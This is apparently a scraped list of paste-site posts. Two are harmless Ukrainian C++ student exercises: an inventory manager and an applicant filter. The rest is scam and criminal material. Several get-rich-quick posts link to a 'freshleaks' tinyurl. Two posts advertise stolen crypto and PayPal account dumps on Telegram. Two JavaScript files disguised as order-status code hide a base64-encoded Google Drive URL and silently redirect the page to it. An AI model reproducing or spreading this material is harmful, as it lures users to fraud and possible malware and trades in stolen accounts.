id,title,username,language,date,content
jHDW3pmW,EARN $900 INSTANTLY 2025⭐ GV,Expired_MRE,JavaScript,Thursday 1st of May 2025 07:07:09 AM CDT," 
Pdf https://tinyurl.com/freshleaks

EfX53hoUUP
"
gnr5FE8b,Другий семестр. Лабораторна робота №16 (Завдання 2),Lavig,C++,Thursday 1st of May 2025 07:07:06 AM CDT,"#include <iostream>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <format>

using namespace std;

struct Product {
    string name{};
    double quantity{};
    double price{};
    double total{};
    string code{};
    string location{};
};

void updateTotal(Product& p) {
    p.total = p.quantity * p.price;
}
void readProducts(vector<Product>& products, const string& filename) {
    ifstream fin(filename);
    if (!fin.is_open()) {
        cout << ""Не вдалося відкрити вихідний файл"";
        return;
    }
    string line;
    while (getline(fin, line)) {
        stringstream ss(line);
        string field{};
        Product p{};
        getline(ss, p.name, ';');
        getline(ss, field, ';');
        p.quantity = stod(field);
        getline(ss, field, ';');
        p.price = stod(field);
        getline(ss, field, ';');
        p.total = stod(field);
        getline(ss, p.code, ';');
        getline(ss, p.location, ';');

        products.push_back(p);
    }
    fin.close();
}
void printProducts(vector<Product>& products) {
    cout << ""Залишки на складі:"" << endl;
    cout << format(""{:^20}{:^20}{:^20}{:^20}{:^20}{:^20}\n"", ""Найменування"", ""Кількість (кг)"", ""Ціна (грн)"", ""Сума (грн)"", ""Артикул"", ""Місце розташування"");
    for (int i = 0; i < products.size(); i++) {
        Product p = products[i];
        cout << format(""{:^20}{:^20.2f}{:^20.2f}{:^20.2f}{:^20}{:^20}\n"", p.name, p.quantity, p.price, p.total, p.code, p.location);
    }
}
void addProduct(vector<Product>& products) {
    Product p;
    cout << ""Введіть найменування товару: "";
    cin.ignore();
    getline(cin, p.name);
    cout << ""Введіть кількість товару (кг): "";
    cin >> p.quantity;
    cout << ""Введіть ціну товару (грн): "";
    cin >> p.price;
    cout << ""Введіть артикул товару: "";
    cin >> p.code;
    cout << ""Введіть місце розташування товару: "";
    cin.ignore();
    getline(cin, p.location);
    updateTotal(p);
    products.push_back(p);
    cout << ""Товар додано."" << endl;
}
void editProduct(vector<Product>& products) {
    string code;
    cout << ""Введіть артикул товару для редагування: "";
    cin >> code;
    for (int i = 0; i < products.size(); i++) {
        if (products[i].code == code) {
            cout << ""Редагування товару "" << products[i].name << "":"" << endl;
            cout << ""Нове найменування: "";
            cin.ignore();
            getline(cin, products[i].name);
            cout << ""Нова кількість (кг): "";
            cin >> products[i].quantity;
            cout << ""Нова ціна (грн): "";
            cin >> products[i].price;
            cout << ""Нове місце розташування: "";
            cin.ignore();
            getline(cin, products[i].location);
            updateTotal(products[i]);
            cout << ""Товар оновлено."" << endl;
            return;
        }
    }
    cout << ""Товар з таким артикулом не знайдено."" << endl;
}
void deleteProduct(vector<Product>& products) {
    string code;
    cout << ""Введіть артикул товару для видалення: "";
    cin >> code;
    for (int i = 0; i < products.size(); i++) {
        if (products[i].code == code) {
            products.erase(products.begin() + i);
            cout << ""Товар видалено."" << endl;
            return;
        }
    }
    cout << ""Товар з таким артикулом не знайдено."" << endl;
}
void saveProducts(vector<Product>& products, const string& filename) {
    ofstream fout(filename);
    if (!fout.is_open()) {
        cout << ""Не вдалося відкрити файл для запису!"" << endl;
        return;
    }
    for (int i = 0; i < products.size(); i++) {
        Product p = products[i];
        fout << p.name << "";"" << p.quantity << "";""
            << p.price << "";"" << p.total << "";""
            << p.code << "";"" << p.location << endl;
    }
    fout.close();
    cout << ""\nДані успішно збережено!"" << endl;
}
void Menu() {
    cout << ""Меню складу"" << endl;
    cout << ""1. Перегляд товарів"" << endl;
    cout << ""2. Додати товар"" << endl;
    cout << ""3. Редагувати товар"" << endl;
    cout << ""4. Видалити товар"" << endl;
    cout << ""5. Зберегти у файл"" << endl;
    cout << ""6. Вийти"" << endl;
}
int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    vector<Product> products;
    readProducts(products, ""D:/files/products.txt"");
    int choice{};
    do {
        Menu();
        cout << ""Оберіть номер опції: "" << endl;
        cin >> choice;
        switch (choice) {
        case 1:
            printProducts(products);
            break;
        case 2:
            addProduct(products);
            break;
        case 3:
            editProduct(products);
            break;
        case 4:
            deleteProduct(products);
            break;
        case 5:
            saveProducts(products, ""D:/files/products.txt"");
            break;
        case 6:
            cout << ""Вихід з програми."" << endl;
            break;
        default: cout << ""Номер опції обрано неправильно. Спробуйте ще раз!"" << endl;
        }
    } while (choice != 6);
}"
K7uDN45B,Order.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 07:06:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52539/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eyCHRnDv,Crypto Accounts,x2LeaF,JavaScript,Thursday 1st of May 2025 07:06:25 AM CDT,93729 Accounts Posted On https://t.me/leakzbyeminem
agK7pX3s,Make $1000 15-MINUTES  (BEGINNER) YR,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:57:57 AM CDT," 
Pdf https://tinyurl.com/freshleaks

8VWeUcbOlr
"
dYEwrE5e,Market.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:51:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60347/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8srnuNyU,PayPal with Balance,x2LeaF,JavaScript,Thursday 1st of May 2025 06:51:03 AM CDT,19109 Accounts Posted On https://t.me/leakzbyeminem
3YtBaqUZ,Другий семестр. Лабораторна робота №16 (Завдання 1),Lavig,C++,Thursday 1st of May 2025 06:51:01 AM CDT,"#include <iostream>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <vector>

using namespace std;

struct Applicant {
    string surname{};
    string name{};
    string patronymic{};
    string gender{};
    string nationality{};
    int year{};
    int month{};
    int day{};
    int postal_code{};
    string country{};
    string region{};
    string district{};
    string city{};
    string street{};
    string building{};
    string apartment{};
    int mark1{};
    int mark2{};
    int mark3{};
    double threshold{};
};

void readApplicants(vector<Applicant>& applicants, const string& filename) {
    ifstream fin(filename);
    if (!fin.is_open()) {
        cout << ""Не вдалося відкрити вихідний файл"";
        return;
    }
    string line;
    while (getline(fin, line)) {
        stringstream ss(line);
        string field{};
        Applicant a{};
        getline(ss, a.surname, ';');
        getline(ss, a.name, ';');
        getline(ss, a.patronymic, ';');
        getline(ss, a.gender, ';');
        getline(ss, a.nationality, ';');
        getline(ss, field, ';');
        a.year = stoi(field);
        getline(ss, field, ';');
        a.month = stoi(field);
        getline(ss, field, ';');
        a.day = stoi(field);
        getline(ss, field, ';');
        a.postal_code = stoi(field);
        getline(ss, a.country, ';');
        getline(ss, a.region, ';');
        getline(ss, a.district, ';');
        getline(ss, a.city, ';');
        getline(ss, a.street, ';');
        getline(ss, a.building, ';');
        getline(ss, a.apartment, ';');
        getline(ss, field, ';');
        a.mark1 = stoi(field);
        getline(ss, field, ';');
        a.mark2 = stoi(field);
        getline(ss, field, ';');
        a.mark3 = stoi(field);
        getline(ss, field, ';');
        a.threshold = stod(field);
        applicants.push_back(a);
    }
    fin.close();
}
void printApplicants(vector<Applicant>& applicants) {
    cout << ""Список усіх абітурієнтів:"" << endl;
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        cout << a.surname << "" "" << a.name << "" "" << a.patronymic << "" - Пороговий бал: "" << a.threshold << endl;
    }
}
void printFilteredApplicants(vector<Applicant>& applicants) {
    cout << ""\nАбітурієнти з пороговим балом > 4:"" << endl;
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        if (a.threshold > 4.0) {
            cout << a.surname << "" "" << a.name << "" "" << a.patronymic << "" - Пороговий бал: "" << a.threshold << endl;
        }
    }
}
void saveFilteredApplicants(vector<Applicant>& applicants, const string& filename) {
    ofstream fout(filename);
    if (!fout.is_open()) {
        cout << ""Не вдалося відкрити файл для запису!"" << endl;
        return;
    }
    for (int i = 0; i < applicants.size(); i++) {
        Applicant a = applicants[i];
        if (a.threshold > 4.0) {
            fout << a.surname << "";"" << a.name << "";"" << a.patronymic << "";""
                << a.gender << "";"" << a.nationality << "";""
                << a.year << "";"" << a.month << "";"" << a.day << "";""
                << a.postal_code << "";"" << a.country << "";"" << a.region << "";""
                << a.district << "";"" << a.city << "";"" << a.street << "";""
                << a.building << "";"" << a.apartment << "";""
                << a.mark1 << "";"" << a.mark2 << "";"" << a.mark3 << "";""
                << a.threshold << endl;
        }
    }
    fout.close();
    cout << ""\nФайл з абітурієнтами, які мають пороговий бал > 4, успішно збережено!""<< endl;
}
int main() {
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    vector<Applicant> applicants;
    readApplicants(applicants, ""D:/files/applicants.txt"");
    printApplicants(applicants);
    printFilteredApplicants(applicants);
    saveFilteredApplicants(applicants, ""D:/files/filtered_applicants.txt"");
}"
KsMddsA5,EARN $900 INSTANTLY 2025 95,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:48:44 AM CDT," 
Pdf https://tinyurl.com/freshleaks

U0xhQB0WPH
"
xjZXdAaG,Make $1000 15-MINUTES (BEGINNER) L4,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:39:30 AM CDT," 
Pdf https://tinyurl.com/freshleaks

uX7oJs24PU
"
